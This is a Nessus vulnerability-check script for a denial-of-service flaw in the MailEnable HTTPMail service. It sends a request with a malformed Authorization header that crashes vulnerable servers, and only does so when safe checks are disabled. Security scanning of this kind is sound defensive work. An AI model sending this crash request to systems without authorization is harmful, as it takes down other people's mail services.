#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(14654);
  script_version("$Revision: 1.1 $");

# script_cve_id("CVE-MAP-NOMATCH");
# NOTE: no CVE id assigned (gat, 09/2004)
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"6038");
  }

  name["english"] = "MailEnable HTTPMail Service Authorization Header DoS Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The target is running at least one instance of MailEnable -
http://www.mailenable.com/ - that has a flaw in the HTTPMail service
(MEHTTPS.exe) in the Professional and Enterprise Editions.  The flaw
can be exploited by issuing an HTTP request with a malformed
Authorization header, which causes a NULL pointer dereference error
and crashes the HTTPMail service. 

Solution : Upgrade to MailEnable Professional / Enterprise 1.19 or
later. 

Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for Authorization Header DoS Vulnerability in MailEnable HTTPMail Service";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "Denial of Service";
  script_family(english:family["english"]);

  script_dependencie("global_settings.nasl", "http_version.nasl");

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");

host = get_host_name();
# nb: HTTPMail defaults to 8080 but can run on any port. 
port = 8080;
if (get_port_state(port)) soc = http_open_socket(port);
if (!soc) {
    port = get_http_port(default:80);
    if (get_port_state(port)) soc = http_open_socket(port);
}
if (!soc) {
  if (log_verbosity > 1) display("Can't determine port for MailEnable's HTTPMail service!\n");
  exit(1);
}
http_close_socket(soc);
if (debug_level) display("debug: searching for Authorization Header DoS vulnerability in MailEnable HTTPMail Service on ", host, ":", port, ".\n");

# Make sure banner's from MailEnable.
banner = get_http_banner(port);
if (debug_level) display("debug: banner =>>", banner, "<<.\n");
if (!egrep(pattern:"^Server: .*MailEnable", string:banner)) exit(0);

# Try to bring it down.
if (safe_checks() == 0) {
  soc = http_open_socket(port);
  if (soc) {
    req = string(
      "GET / HTTP/1.0\r\n",
      "Authorization: X\r\n",
      "\r\n"
    );
    if (debug_level) display("debug: sending =>>", req, "<<\n");
    send(socket:soc, data:req);
    res = http_recv(socket:soc);
    http_close_socket(soc);
    if (res) {
      if (debug_level) display("debug: res =>>", res, "<<\n");
    }
    else {
      security_hole(port);
    }
  }
}
